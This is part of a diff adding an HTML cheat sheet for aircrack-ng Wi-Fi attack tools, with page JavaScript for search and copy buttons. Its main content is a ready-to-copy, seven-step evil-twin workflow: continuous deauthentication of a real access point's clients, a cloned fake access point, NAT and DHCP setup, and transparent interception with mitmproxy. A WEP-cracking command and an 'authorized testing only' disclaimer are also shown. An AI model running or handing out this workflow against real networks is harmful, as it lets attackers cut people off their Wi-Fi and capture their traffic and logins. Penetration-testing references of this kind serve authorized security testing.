+aircrack-ng wep_capture-01.ivs</code>
+          </div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-header" onclick="toggleCard(this)">
+          <span class="cmd-name">Evil Twin MITM Attack</span>
+          <span class="cmd-brief">Fake AP with traffic interception</span>
+          <span class="cmd-toggle">+</span>
+        </div>
+        <div class="cmd-body">
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <code><span class="comment">## STEP 1: Setup monitor mode</span>
+airmon-ng check kill
+airmon-ng start wlan0
+
+<span class="comment">## STEP 2: Note target AP details</span>
+airodump-ng wlan0mon
+<span class="comment"># Record SSID, BSSID, channel</span>
+
+<span class="comment">## STEP 3: Deauth clients from real AP</span>
+aireplay-ng -0 0 -a REAL_AP_BSSID wlan0mon &
+
+<span class="comment">## STEP 4: Start evil twin on same channel</span>
+airbase-ng -e "TargetSSID" -a REAL_AP_BSSID -c 6 wlan0mon &
+
+<span class="comment">## STEP 5: Configure fake AP interface</span>
+ifconfig at0 up 192.168.0.1 netmask 255.255.255.0
+
+<span class="comment">## STEP 6: Setup NAT + DHCP</span>
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+dnsmasq --interface=at0 --dhcp-range=192.168.0.10,192.168.0.100,12h
+
+<span class="comment">## STEP 7: Intercept with sslstrip/mitmproxy</span>
+mitmproxy --mode transparent -p 8080</code>
+          </div>
+          <div class="tip-box danger">
+            <strong>⚠ Authorized Testing Only</strong>
+            This workflow is for authorized penetration testing of your own infrastructure.
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<script>
+  function showSection(id) {
+    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+    document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
+    document.getElementById('section-' + id)?.classList.add('active');
+    document.querySelectorAll('.nav-link').forEach(l => {
+      if (l.getAttribute('onclick')?.includes("'" + id + "'")) {
+        l.classList.add('active');
+      }
+    });
+    document.getElementById('main-content').scrollTop = 0;
+  }
+
+  function toggleCard(header) {
+    const card = header.parentElement;
+    card.classList.toggle('open');
+  }
+
+  function toggleTrouble(header) {
+    const item = header.parentElement;
+    item.classList.toggle('open');
+  }
+
+  function copyCode(btn) {
+    const block = btn.parentElement.querySelector('code');
+    const text = block.innerText;
+    navigator.clipboard.writeText(text).then(() => {
+      btn.textContent = 'COPIED';
+      setTimeout(() => btn.textContent = 'COPY', 1500);
+    });
+  }
+
+  // Search functionality
+  const searchInput = document.getElementById('search');
+  searchInput.addEventListener('input', function() {
+    const q = this.value.toLowerCase().trim();
+    if (!q) {
+      document.querySelectorAll('.cmd-card, .trouble-item').forEach(c => c.style.display = '');
+      return;
+    }
+    // Auto-switch to first section with match
+    const sections = ['aircrack','airodump','aireplay','airmon','airdecap','airtun','packetforge','airbase','airdecloak','wesside','easside','buddy','troubleshoot','workflows'];
+    let found = false;
+    sections.forEach(s => {
+      const sec = document.getElementById('section-' + s);
+      if (!sec) return;
+      const cards = sec.querySelectorAll('.cmd-card, .trouble-item');
+      cards.forEach(c => {
+        if (c.textContent.toLowerCase().includes(q)) {
+          c.style.display = '';
+          if (!found) { showSection(s); found = true; }
+        } else {
+          c.style.display = 'none';
+        }
+      });
+    });
+  });
+
+  // Open all cards when searching
+  searchInput.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') {
+      document.querySelectorAll('.cmd-card, .trouble-item').forEach(c => {
+        if (c.style.display !== 'none') c.classList.add('open');
+      });
+    }
+  });
+</script>
+</body>
+</html>
